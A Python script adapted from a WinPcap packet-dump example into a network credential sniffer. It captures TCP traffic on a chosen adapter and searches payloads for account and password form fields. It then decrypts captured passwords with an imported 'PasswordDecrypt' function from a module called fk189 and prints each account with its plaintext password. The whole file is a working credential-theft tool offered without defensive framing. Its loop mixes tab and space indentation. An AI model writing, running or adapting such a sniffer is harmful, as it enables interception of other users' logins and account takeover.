#!/usr/bin/env python
#-------------------------------------------------------------------------------
# Name:        basic_dump_ex.py
#
# Author:      Massimo Ciani
#
# Created:     01/09/2009
# Copyright:   (c) Massimo Ciani 2009
#
#-------------------------------------------------------------------------------

from __future__ import print_function

from ctypes import *
from winpcapy import *
import sys
import time
import struct
import string
import platform
import urlparse

if platform.python_version()[0] == "3":
	raw_input=input
header = POINTER(pcap_pkthdr)()
pkt_data = POINTER(c_ubyte)()
alldevs=POINTER(pcap_if_t)()
errbuf= create_string_buffer(PCAP_ERRBUF_SIZE)
## Retrieve the device list
if (pcap_findalldevs(byref(alldevs), errbuf) == -1):
	print ("Error in pcap_findalldevs: %s\n" % errbuf.value)
	sys.exit(1)
## Print the list
i=0
try:
	d=alldevs.contents
except:
	print ("Error in pcap_findalldevs: %s" % errbuf.value)
	print ("Maybe you need admin privilege?\n")
	sys.exit(1)
while d:
	i=i+1
	print("%d. %s" % (i, d.name))
	if (d.description):
		print (" (%s)\n" % (d.description))
	else:
		print (" (No description available)\n")
	if d.next:
		d=d.next.contents
	else:
		d=False

if (i==0):
	print ("\nNo interfaces found! Make sure WinPcap is installed.\n")
	sys.exit(-1)
print ("Enter the interface number (1-%d):" % (i))
inum= raw_input('--> ')
if inum in string.digits:
    inum=int(inum)
else:
    inum=0
if ((inum < 1) | (inum > i)):
    print ("\nInterface number out of range.\n")
    ## Free the device list
    pcap_freealldevs(alldevs)
    sys.exit(-1)
## Jump to the selected adapter
d=alldevs
for i in range(0,inum-1):
    d=d.contents.next
## Open the device
## Open the adapter
d=d.contents
adhandle = pcap_open_live(d.name,65536,1,0,errbuf)
if (adhandle == None):
    print("\nUnable to open the adapter. %s is not supported by Pcap-WinPcap\n" % d.contents.name)
    ## Free the device list
    pcap_freealldevs(alldevs)
    sys.exit(-1)
fcode = bpf_program()
NetMask = 0xffffff
## compile the filter
if pcap_compile(adhandle,byref(fcode),"tcp",1,NetMask) < 0:
    print('\nError compiling filter: wrong syntax.\n')
    pcap_close(adhandle)
    sys.exit(-3)
## set the filter
if pcap_setfilter(adhandle,byref(fcode)) < 0:
    print('\nError setting the filter\n')
    pcap_close(adhandle)
    sys.exit(-4)
print("\nlistening on %s...\n" % (d.description))
## At this point, we don't need any more the device list. Free it
pcap_freealldevs(alldevs)
## Retrieve the packets
res=pcap_next_ex( adhandle, byref(header), byref(pkt_data))
# Add By bGN4 at 2016-06-23
from fk189 import PasswordDecrypt
counter = [0,1]
print('{:15}\t{:5}\t{:11}\t{}'.format('Time', 'Len', 'Account', 'Password'))
while(res >= 0):
        print('\rpackets: ({0[0]}/{0[1]}) ...'.format(counter), end='')
	if(res == 0): # Timeout elapsed
		break
	if 128<header.contents.len<4096:
                # convert the timestamp to readable format
                timestr = time.strftime("%H:%M:%S"+',%.6d'%header.contents.ts.tv_usec, time.localtime(header.contents.ts.tv_sec))
                data = b''.join([chr(pkt_data[i]) for i in range(1,header.contents.len + 1)])
                ppos = data.find('assword=')
                if ppos>=0:
                        upos = data.find('ccount=')
                        if upos>=0:
                                counter[0] += 1
                                epos = data.find('&', ppos)
                                passwd = urlparse.parse_qs(data[ppos+8-2:None if epos<0 else epos]).get('d',[])[0]
                                print('\r{}\t#{:4}\t{}\t{}'.format(timestr,header.contents.len,data[upos+7:upos+7+11],PasswordDecrypt(passwd)))
	res=pcap_next_ex( adhandle, byref(header), byref(pkt_data))
	counter[1] += 1
if(res == -1):
	print("\nError reading the packets: %s\n", pcap_geterr(adhandle));
	sys.exit(-1)
if(res == 0):
        print ("\nTimeout elapsed\n")
pcap_close(adhandle)

